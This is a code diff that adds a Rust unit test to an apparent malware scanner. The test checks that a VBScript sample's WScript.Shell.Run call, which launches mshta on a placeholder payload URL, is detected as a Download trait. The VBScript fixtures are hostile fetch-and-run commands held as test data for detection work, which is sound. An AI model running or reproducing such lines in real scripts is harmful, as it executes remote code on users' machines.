@@ -16929,6 +16929,25 @@ sh.Run "ht" & "tps://vbs-run.example/panel", 0, False"#;
     }
 
     #[test]
+    fn vbs_wscript_shell_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta vbs-run-schemeless.example/payload.hta", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://vbs-run-schemeless.example/payload.hta"
+            )),
+            "no Download trait from VBS WScript.Shell.Run schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_concat_variable() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
